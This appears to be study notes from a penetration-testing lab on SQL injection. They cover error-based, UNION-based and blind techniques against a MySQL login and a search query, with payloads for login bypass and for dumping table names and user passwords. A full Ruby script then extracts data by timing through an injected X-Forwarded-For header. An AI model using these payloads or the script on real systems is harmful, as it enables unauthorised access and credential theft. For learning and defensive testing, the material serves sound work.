# Identifying SQLi via Error-based Payloads

At a login where the sql query is likely 

```
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
```

So the username `$uname` would be the uname field and the `$passwd` would be the password field of a login form.

if you inject
```
admin' OR 1=1 -- //
```

you have the query 

```
SELECT * FROM users WHERE user_name= 'admin' OR 1=1 --
```

which is valid sql syntax and will return true as if there is no admin user, there is at least `1=1` also the `--` is a comment so comment out the rest of the sql query.

If you get an error from entering `admin'` then the error may be displayed on the page.

eg:

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for right syntax to use near 'acdfadf879657865876587i6acfd'' at line 1
```

If the error is visible it is considered `in-band`

moving on we can put sql commands in the injection section.

```
' or 1=1 in (select @@version) -- //
```

NB: MySQL accepts both `version()` and `@@version`

Result:

```
Warning: 1292: Truncated incorrect DOUBLE value: '8.0.28'
```

how about we try a SELECT statement instead:

```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

Result:

```
Warning: 1292: Truncated incorrect DOUBLE value: '212134566fda35afdadfacc345'
```

# UNION-based Payloads

Now analyse this query that is in a website.

```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["input"]."%'";
```

First you need to discover the correct number of columns which you do by iterating through the following injection:

```
' ORDER BY 1-- //
```

and eventually you might get the following error

```
' ORDER BY 6-- //
```

Result:

```
Unknown column '6' in 'order clause'
```

So now lets try a UNION command where we know we need to use 5 columns (and `%` is a wildcard in sql)

```
%' UNION SELECT database(), user(), @@version, null, null -- //
```

Result:

```
Name            | Phone  | Address | Country
--------------------------------------------
...
root@172.17.0.3  8.0.28
```

So now we need to pad out the columns to align the data to be visible as first column appears to be left off.

Now lets try to get table names and columns names from the current database:

```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

Result:

```
Name          | Phone     | Address | Country
--------------------------------------------
customers       id          webapp
customers       name        webapp
customers       phone       webapp
customers       address     webapp
customers       country     webapp
users           id          webapp
users           username    webapp
users           password    webapp
users           description webapp
```

etc etc

```
' UNION SELECT null, username, password, description, null FROM users -- //
```

# Blind SQL Injections

check for sql injection and use an AND clause so that you can boolean check to see if different usernames exist.

```
admin' AND 1=1 -- //
```

instead lets try sleep functions to see if we can get them to trigger.

```
' AND IF (1=1, sleep(3),'false') -- //
```

if there is a delay then the true clause exists in this case the `1=1` which is always true so you can get a sleep delay if the sql code worked.

for deeper analysis of manual blind sql injection i like to use a poc from pentesterlab - https://pentesterlab.com/exercises/from-sqli-to-shell-ii


in ruby the following will slowly work out the response to a blind sql injection.

in this case the injection entry point is the `X-Forwarded-For: #{p}`

```
require 'socket'

inj = "select user()"
str = ""

def test(sql)
  p = "hacker' or if((#{sql}),sleep(0.5),0) and '1'='1"
  t = Time.now
  begin
    s = TCPSocket.new("vulnerable",80)
    s.write("GET / HTTP/1.1\r\nHost: vulnerable\r\nX-Forwarded-For: #{p}\r\nConnection: close\r\n\r\n")
    s.readlines()
    s.close
  rescue Errno::ECONNRESET, EOFError
  end
  return ((Time.now-t)>0.5)
end

# dummy initialisation for the while loop, we loop until the returned value is null
value = 1
i = 0

while value != 0
  # i is the position in the string
  i+=1
  # initialise to 0 the value we are trying to retrieve
  value = 0
  # for each bit
  0.upto(6) do |bit|
    # 2**bit is 2^bit and will do all the bit masking work
    sql = "select ascii(substring((#{inj}),#{i},1))&#{2**bit}"
    if test(sql)
      # if the returned value is true
      # we add the mask to the current_value
      value+=2**bit
    end
  end
  # value is an ascii value, we get the corresponding character using the `.chr` ruby function
  str+= value.chr
  puts str
end
```

The Result is:

```
% ruby course/exploit.rb
p
pe
pen
pent
pente
pentes
pentest
penteste
[...]
pentesterlab@localhost
```
